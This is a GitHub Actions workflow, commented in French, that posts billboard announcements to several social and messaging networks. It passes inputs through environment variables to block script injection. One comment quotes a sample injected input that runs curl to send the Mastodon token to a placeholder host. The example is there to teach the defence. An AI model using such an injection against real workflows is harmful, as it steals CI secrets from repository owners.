name: Broadcast — Diffusion multi-protocoles

on:
  push:
    branches: [main]
    paths:
      - 'src/data/config.json'
  workflow_dispatch:
    inputs:
      billboard_id:
        description: 'ID du panneau à diffuser'
        required: true
        type: string
      canaux:
        description: 'Canaux à rejouer, séparés par des virgules (vide = tous). Ex. : nostr,matrix'
        required: false
        type: string

# Lecture seule : la diffusion ne pousse rien dans le dépôt.
permissions:
  contents: read

jobs:
  broadcast:
    runs-on: ubuntu-latest
    # Attente du déploiement (10 min au plus) + 45 s entre panneaux.
    timeout-minutes: 30

    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0 # requis pour git show sur le commit précédent

      # Node 22 au minimum : nostr-tools lit le `WebSocket` GLOBAL, absent de
      # Node 20. Sous Node 20 les quatre relais échouaient (« WebSocket is not
      # defined ») et le heartbeat sortait en rouge chaque semaine. 24 = LTS
      # active, celle du développement local.
      - uses: actions/setup-node@v4
        with:
          node-version: 24
          cache: npm

      - name: Installer les dépendances
        run: npm ci

      # ATTENTION — toute donnée d'événement passe par `env:`, jamais par
      # `${{ }}` dans le corps du script.
      #
      # `${{ }}` n'est pas une variable : c'est une substitution TEXTUELLE
      # effectuée dans la source du script avant que bash ne la lise. Les
      # guillemets écrits ici ne protègent donc rien, puisque les guillemets de
      # l'attaquant font partie du texte substitué. `billboard_id` est une
      # entrée libre de workflow_dispatch : la valeur
      #     x"; curl -d "$MASTODON_TOKEN" https://exemple.invalid; echo "
      # produisait une ligne de commande complète exécutée dans un job dont le
      # bloc `env:` porte les huit secrets de diffusion. Une variable
      # d'environnement, elle, est transmise hors-bande — bash ne réanalyse
      # jamais son contenu.
      - name: Extraire la configuration précédente (si push)
        env:
          EVENT_NAME: ${{ github.event_name }}
          PREV_SHA: ${{ github.event.before }}
        run: |
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            echo "Mode manuel (dispatch), pas de diff."
          else
            if [ -z "$PREV_SHA" ] || [ "$PREV_SHA" = "0000000000000000000000000000000000000000" ]; then
              echo "Premier push ou SHA nul, pas de diff possible."
            else
              git show "$PREV_SHA:src/data/config.json" > prev-config.json 2>/dev/null || echo "Impossible de lire la config précédente (première création ?)"
            fi
          fi

      # Les secrets vivent sur CETTE étape seulement. Ils étaient déclarés au
      # niveau du job, donc présents dans l'environnement de `npm ci` — et des
      # scripts d'installation de toutes les dépendances transitives — sans
      # aucune raison. Seule la diffusion les lit.
      - name: Lancer la diffusion
        env:
          EVENT_NAME: ${{ github.event_name }}
          BILLBOARD_ID: ${{ github.event.inputs.billboard_id }}
          CANAUX: ${{ github.event.inputs.canaux }}
          SITE_URL: ${{ secrets.SITE_URL || 'https://board.wooddyviat.com' }}
          MASTODON_TOKEN: ${{ secrets.MASTODON_TOKEN }}
          MASTODON_INSTANCE: ${{ secrets.MASTODON_INSTANCE }}
          BLUESKY_HANDLE: ${{ secrets.BLUESKY_HANDLE }}
          BLUESKY_PASSWORD: ${{ secrets.BLUESKY_PASSWORD }}
          NOSTR_PRIVATE_KEY: ${{ secrets.NOSTR_PRIVATE_KEY }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
          MATRIX_HOMESERVER: ${{ secrets.MATRIX_HOMESERVER }}
          MATRIX_ACCESS_TOKEN: ${{ secrets.MATRIX_ACCESS_TOKEN }}
          MATRIX_ROOM_ID: ${{ secrets.MATRIX_ROOM_ID }}
          MISSKEY_INSTANCE: ${{ secrets.MISSKEY_INSTANCE }}
          MISSKEY_TOKEN: ${{ secrets.MISSKEY_TOKEN }}
          NTFY_TOPIC: ${{ secrets.NTFY_TOPIC }}
          NTFY_SERVER: ${{ secrets.NTFY_SERVER }}
          NTFY_TOKEN: ${{ secrets.NTFY_TOKEN }}
        run: |
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            node scripts/broadcast.mjs --id "$BILLBOARD_ID"
          elif [ -f prev-config.json ]; then
            node scripts/broadcast.mjs --prev prev-config.json
          else
            echo "Pas de configuration précédente disponible, aucun message à diffuser automatiquement."
          fi

